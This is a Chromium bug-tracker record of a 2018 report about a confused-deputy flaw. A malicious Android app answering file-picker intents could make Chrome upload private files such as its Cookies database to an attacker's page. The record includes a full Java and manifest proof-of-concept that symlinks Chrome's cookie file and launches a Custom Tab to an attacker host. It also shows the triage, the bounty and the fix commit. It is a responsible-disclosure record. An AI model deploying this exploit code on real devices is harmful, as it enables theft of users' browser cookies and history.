# Security: Confused deputy attack against Chrome Android application might lead to internal storage file disclosure

| Field | Value |
|-------|-------|
| **Issue ID** | [40091828](https://issues.chromium.org/issues/40091828) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Mobile>Intents |
| **Platforms** | Android |
| **Reporter** | an...@truel.it |
| **Assignee** | qi...@chromium.org |
| **Created** | 2018-07-01 |
| **Bounty** | $1,000.00 |

## Description

Tested on:
---------

- Android 5.1.1 Chrome 56.0.292487
- Android 8.0.0 Chrome 67.0.3396.87

Vulnerability Description
-------------------------

Due to the lack of validation on the file:// URI taken from the result Intent of a GET_CONTENT action, the Chrome Android application can be tricked into disclosing arbitrary files from its sandbox by a malicious third party application installed on the device. 
The severity of this issue is estimated medium, as it requires some sort of user-interaction; a sample attack scenario is described below:

- The attacker application declares an intent-filter to handle GET_CONTENT actions, so that it can be selected to provide files when the user encounter an upload form during the navigation.

 <intent-filter>
    <action android:name="android.intent.action.GET_CONTENT" />
    <category android:name="android.intent.category.OPENABLE" />
    <category android:name="android.intent.category.DEFAULT" />
    <data android:mimeType="*/*" />
</intent-filter>

- The attacker application responds to GET_CONTENT intents pretending to let the user select a legit file, but providing instead a specially crafted file:// URI. Such URI can represent a file located inside the Chrome application sandbox, or a symlink located in the attacker internal storage but pointing to a file inside the Chrome application sandbox (the latter gives the attacker control over the filename displayed during the upload).

if(action.equals(Intent.ACTION_GET_CONTENT) || action.equals(Intent.ACTION_OPEN_DOCUMENT)) {
    Intent result = new Intent();
    result.setData(Uri.parse("file:///data/data/com.android.chrome/app_chrome/Default/Cookies"));
	result.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
    setResult(Activity.RESULT_OK, result);
    finish();
}

- The attacker application triggers the navigation of an attacker-controlled webpage showing an upload form (i.e. embedding a Chrome Custom Tab), and tricks the user into proceeding with the upload selecting the application itself as file provider. 

if(action.equals(Intent.ACTION_MAIN)) {
    CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
    CustomTabsIntent ct = builder.build();
    ct.intent.setPackage("com.android.chrome");
    ct.intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    ct.launchUrl(this, Uri.parse("http://attacker/upload.html"));
}

Such attack results in the victim user unintentionally leaking a file from the Chrome application's internal storage (i.e. Cookies or History database) to an attacker-controlled website. To better illustrate the intended attack flow, the following pictures have been attached:

1. chrome1.png - The attacker application's MainActivity embeds an attacker-controlled website in a Chrome Custom Tab
2. chrome2.png - The user selects the attacker application to fulfill the upload request
3. chrome3.png - The attacker-controlled filename is displayed
4. chrome4.png - The Cookies database has been leaked to the attacker website

Proof Of Concept
----------------

The following proof of concept can be used to reproduce the attack described above.

== MainActivity.java ==

package it.truel.SymLeak;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.StrictMode;
import android.support.customtabs.CustomTabsIntent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.URI;
import static java.lang.Runtime.*;

public class MainActivity extends AppCompatActivity {

    public static String TAG = "[Chrome PoC]";
    public static String FILE = "/data/data/it.truel.SymLeak/files/harmless.pdf";
    public static String TARGET_FILE = "/data/data/com.android.chrome/app_chrome/Default/Cookies";


    private void execCmd(String cmd) {

        try {

            Log.d(TAG, "Executing " + cmd);

            Process proc = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(proc.getInputStream())
            );

            StringBuilder out = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                out.append("\t" + line + "\n");
            }

            if(!out.toString().isEmpty()) Log.d(TAG, "Output:\n" + out);

        } catch (IOException e) {
            Log.d(TAG, "Error executing " + cmd + "\n" + e.toString());
        }

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d(TAG,"==== SymLeak Chrome PoC ====");
        String mySbx = getFilesDir().toString().replace("files", "");
        Log.d(TAG, "Sandbox: " + mySbx);
        Log.d(TAG, "Symlink: " + FILE);
        Log.d(TAG, "Target: " + TARGET_FILE);

        if(Build.VERSION.SDK_INT>=24){
            try{
                Log.d(TAG, "Android >= 7, need to disable death on file uri exposure");
                Method m = StrictMode.class.getMethod("disableDeathOnFileUriExposure");
                m.invoke(null);
            }catch(Exception e){
                Log.d(TAG, "Error disabling death on file uri exposure, failed :(\n" + e.toString());
            }
        } else { Log.d(TAG, "Android < 7, nothing fancy to do"); }

        execCmd("rm " + FILE);
        execCmd("chmod 777 " + getFilesDir());
        execCmd("ls -la " + mySbx);
        execCmd("chmod 777 " + mySbx);
        execCmd("ln -s " + TARGET_FILE + " " + FILE);
        execCmd("ls -la " + getFilesDir());

        Log.d(TAG, getIntent().toString());
        String action = getIntent().getAction();

        if(action.equals(Intent.ACTION_GET_CONTENT) || action.equals(Intent.ACTION_OPEN_DOCUMENT)) {
            Uri resultUri = Uri.parse("file://" + FILE);
            Intent result = new Intent();
            Log.d(TAG, "Trying to provide: " + "file://" + FILE + " as result");
            result.setData(resultUri);
            result.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            setResult(Activity.RESULT_OK, result);
            finish();
        }

        if(action.equals(Intent.ACTION_MAIN)) {
            CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
            CustomTabsIntent customTabsIntent = builder.build();
            customTabsIntent.intent.setPackage("com.android.chrome");
            customTabsIntent.intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            customTabsIntent.launchUrl(this, Uri.parse("http://attacker/upload.html"));
        }

    }

}

== AndroidManifest.xml ==

<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="it.truel.SymLeak">
    <uses-permission android:name="android.permission.INTERNET" />
    <application
        android:allowBackup="true"
        android:debuggable="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">
        <activity android:name="it.truel.SymLeak.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.GET_CONTENT" />
                <category android:name="android.intent.category.OPENABLE" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="*/*" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.OPEN_DOCUMENT" />
                <category android:name="android.intent.category.OPENABLE" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="*/*" />
            </intent-filter>
        </activity>
    </application>
</manifest>

## Attachments

- [chrome1.png](attachments/chrome1.png) (image/png, 61.2 KB)
- [chrome2.png](attachments/chrome2.png) (image/png, 124.9 KB)
- [chrome3.png](attachments/chrome3.png) (image/png, 61.4 KB)
- [chrome4.png](attachments/chrome4.png) (image/png, 359.1 KB)

## Timeline

### ke...@chromium.org (2018-07-03)

This does seem like something that shouldn't be possible. You mention that the severity is reduced by user interaction, and also because the user has to have installed a malicious app to begin with. I will flag as Sev-Medium somewhat conservatively though because that's potentially a very bad data exfiltration.

Assigning to tedchoc@ for further assessment, and also cc'ing android-security-core@ because palmer is suggesting this could be considered a platform issue in what an intent handler can provide access to.

[Monorail components: Mobile>Intents]

### sh...@chromium.org (2018-07-16)

tedchoc: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### te...@chromium.org (2018-07-16)

+qinmin@ who I think might have the most historical knowledge of how SelectFileDialog works.

Looks like we could ensure a file path is not provided with our package name in it in this method: SelectFileDialog#onIntentCompleted.

### sh...@chromium.org (2018-07-30)

qinmin: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mp...@google.com (2018-09-06)

Ping from the security sheriff. Any thoughts or progress here?

### sh...@chromium.org (2018-10-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-24)

[Empty comment from Monorail migration]

### dr...@chromium.org (2019-05-31)

Friendly security sheriff ping - any update on this? Are you able to reproduce the bug?

### sh...@chromium.org (2019-06-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-07-31)

[Empty comment from Monorail migration]

### qi...@chromium.org (2019-08-21)

For solution in #3, there are a couple issues:
1. File path is used in some android versions, probably K and M. Even for M+, external sdcard still used file paths
2. we don't know which app provides the intent. The package name in the intent can be spoofed, so we don't know whether it is Chrome itself that provides the intent

We can however block any file path from the private data/ dir to be uploaded, this is because:
1. Chrome itself won't provide files under its /data/ dir for upload. 
2. other apps should not visit chrome's /data/ dir (unless rooted)




### qi...@chromium.org (2019-08-21)

[Empty comment from Monorail migration]

### qi...@chromium.org (2019-08-21)

BTW, file path may still be used on M+ devices if user has some file explorer app, which will provide file path to file selection dialog.  But for non-rooted devices, it should not access Chrome's data/ dir.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-08-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/70912634b85f207b0b9d7b1406cdb1d5fb146096

commit 70912634b85f207b0b9d7b1406cdb1d5fb146096
Author: Min Qin <qinmin@chromium.org>
Date: Thu Aug 22 18:03:47 2019

Don't allow files under Chrome's data dir to be uploaded

Files under Chrome's data dir is private to Chrome. Other apps shouldn't
be able to access it. So hard coded file path provided by another app
should also not work.

BUG=859349

Change-Id: I51bc25a278ff70dcfbaaab8bc8e52123063d9a0c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1762916
Commit-Queue: Min Qin <qinmin@chromium.org>
Reviewed-by: Peter Beverloo <peter@chromium.org>
Cr-Commit-Position: refs/heads/master@{#689545}

[modify] https://crrev.com/70912634b85f207b0b9d7b1406cdb1d5fb146096/ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java


### qi...@chromium.org (2019-09-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-04)

[Empty comment from Monorail migration]

### na...@google.com (2019-09-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-07)

Requesting merge to beta M77 because latest trunk commit (689545) appears to be after beta branch point (681094).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-09-07)

This bug requires manual review: We are only 2 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://goto.google.com/chrome-release-branch-merge-guidelines
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), dgagnon@(ChromeOS), lakpamarthy@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2019-09-19)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2019-09-19)

Congrats! The Panel decided to reward $1,000 for this report :) 

### na...@google.com (2019-09-19)

[Empty comment from Monorail migration]

### la...@google.com (2019-09-27)

merge rejected for M77

### ad...@google.com (2019-10-18)

[Empty comment from Monorail migration]

### ad...@google.com (2019-10-18)

andrea.palazzo@truel.it: Thanks for the report. How would you like to be credited in the release notes?

### ad...@chromium.org (2019-10-18)

[Empty comment from Monorail migration]

### ad...@google.com (2019-10-18)

[Empty comment from Monorail migration]

### ad...@chromium.org (2019-11-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-12-11)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/859349?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091828)*
